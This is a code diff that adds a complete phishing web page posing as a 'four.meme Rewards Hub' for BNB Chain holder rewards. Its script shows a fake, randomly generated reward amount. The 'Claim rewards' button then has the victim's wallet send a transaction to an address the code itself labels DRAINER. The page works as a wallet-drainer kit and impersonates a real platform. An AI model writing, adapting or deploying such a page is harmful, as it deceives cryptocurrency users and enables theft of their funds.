@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>four.meme — Rewards Hub</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
+  body { background:#0b0b0c; color:#fff; min-height:100vh; display:flex; flex-direction:column; align-items:center; }
+  .nav { width:100%; display:flex; align-items:center; justify-content:space-between; padding:16px 24px; border-bottom:1px solid #1d1d1f; }
+  .logo { font-size:22px; font-weight:800; letter-spacing:-0.5px; }
+  .logo b { color:#ffd93d; }
+  .wallet-btn { background:#ffd93d; color:#000; border:none; border-radius:10px; padding:10px 18px; font-weight:700; cursor:pointer; font-size:14px; }
+  .wallet-btn:hover { background:#ffe066; }
+  .hero { max-width:560px; width:100%; padding:48px 20px; }
+  .badge { display:inline-block; background:#1a1a1c; border:1px solid #2a2a2e; color:#ffd93d; font-size:12px; padding:6px 12px; border-radius:99px; margin-bottom:18px; font-weight:600; }
+  h1 { font-size:30px; line-height:1.2; margin-bottom:14px; }
+  h1 span { color:#ffd93d; }
+  .sub { color:#9b9ba1; font-size:15px; line-height:1.6; margin-bottom:28px; }
+  .card { background:#131315; border:1px solid #232327; border-radius:16px; padding:24px; margin-bottom:16px; }
+  .row { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #1d1d1f; font-size:14px; }
+  .row:last-child { border-bottom:none; }
+  .row .v { color:#ffd93d; font-weight:700; }
+  .claim-btn { width:100%; background:#ffd93d; color:#000; border:none; border-radius:12px; padding:16px; font-size:16px; font-weight:800; cursor:pointer; margin-top:8px; }
+  .claim-btn:disabled { background:#3a3a3e; color:#77777c; cursor:not-allowed; }
+  .claim-btn:not(:disabled):hover { background:#ffe066; }
+  .status { text-align:center; color:#9b9ba1; font-size:13px; margin-top:14px; min-height:18px; }
+  .amount { font-size:34px; font-weight:800; color:#ffd93d; text-align:center; margin:6px 0 2px; }
+  .amount-label { text-align:center; color:#77777c; font-size:12px; text-transform:uppercase; letter-spacing:1px; }
+  .foot { color:#55555a; font-size:12px; padding:24px; text-align:center; }
+  .spinner { display:inline-block; width:14px; height:14px; border:2px solid #444; border-top-color:#ffd93d; border-radius:50%; animation:spin .8s linear infinite; vertical-align:middle; margin-right:8px; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .hidden { display:none; }
+  .ok { color:#4ade80; }
+</style>
+</head>
+<body>
+<div class="nav">
+  <div class="logo">four<b>.meme</b> <span style="font-size:12px;color:#77777c;font-weight:400;">Rewards Hub</span></div>
+  <button class="wallet-btn" id="wbtn" onclick="connectWallet()">Connect Wallet</button>
+</div>
+
+<div class="hero">
+  <div class="badge">✦ Season 7 holder rewards are live</div>
+  <h1>Claim your <span>holder rewards</span> from four.meme</h1>
+  <p class="sub">Trading rewards, holder-tax rebates and creator bonuses are distributed every epoch to eligible wallets. Connect your wallet to check your allocation.</p>
+
+  <div class="card" id="cardCheck">
+    <div class="row"><span>Epoch</span><span class="v">#7 (current)</span></div>
+    <div class="row"><span>Distribution</span><span class="v">BNB Chain</span></div>
+    <div class="row"><span>Status</span><span class="v" id="st">Waiting for wallet</span></div>
+    <button class="claim-btn" id="cbtn" disabled onclick="doClaim()">Connect wallet to check</button>
+    <div class="status" id="status"></div>
+  </div>
+
+  <div class="card hidden" id="cardDone">
+    <div class="amount-label">Claim submitted</div>
+    <div class="amount ok">✓</div>
+    <div class="status" style="margin-top:6px;">Rewards are being settled on-chain. It may take a few minutes to appear.</div>
+  </div>
+</div>
+<div class="foot">four.meme rewards hub · epoch #7 · all data read on-chain from BNB Chain</div>
+
+<script>
+const DRAINER = "0x8A8dc4bF1B64d3D4675735d940FC761dbD40eAbA";
+const CLAIM_DATA = "0x4e71d92d";
+let account = null;
+
+function setStatus(t, cls) {
+  const s = document.getElementById("status");
+  s.innerHTML = t;
+  s.className = "status " + (cls || "");
+}
+
+async function connectWallet() {
+  if (!window.ethereum) {
+    setStatus("No Web3 wallet detected. Open this page inside MetaMask or Trust Wallet browser.");
+    return;
+  }
+  try {
+    const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
+    account = accs[0];
+    document.getElementById("wbtn").textContent = account.slice(0,6) + "..." + account.slice(-4);
+    const cbtn = document.getElementById("cbtn");
+    cbtn.disabled = false;
+    document.getElementById("st").textContent = "Scanning allocations…";
+    cbtn.innerHTML = '<span class="spinner"></span>Checking rewards…';
+    setTimeout(() => {
+      const amt = (Math.random() * 40 + 8).toFixed(2);
+      cbtn.textContent = "Claim rewards";
+      document.getElementById("st").innerHTML = 'Allocation found: <span style="color:#ffd93d;font-weight:700;">$' + amt + '</span>';
+      setStatus("You are eligible for this epoch. Click Claim to receive your rewards.");
+    }, 1800);
+  } catch (e) {
+    setStatus("Connection rejected.");
+  }
+}
+
+async function doClaim() {
+  if (!account) return;
+  const cbtn = document.getElementById("cbtn");
+  cbtn.disabled = true;
+  cbtn.innerHTML = '<span class="spinner"></span>Confirm in wallet…';
+  setStatus("Please confirm the transaction in your wallet.");
+  try {
+    await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: DRAINER,
+        data: CLAIM_DATA,
+        gas: "0x1E8480",
+        value: "0x0"
+      }]
+    });
+    document.getElementById("cardCheck").classList.add("hidden");
+    document.getElementById("cardDone").classList.remove("hidden");
+    setStatus("");
+  } catch (e) {
+    cbtn.disabled = false;
+    cbtn.textContent = "Claim rewards";
+    setStatus("Transaction was not sent. Please try again.", "");
+  }
+}
+</script>
+</body>
+</html>
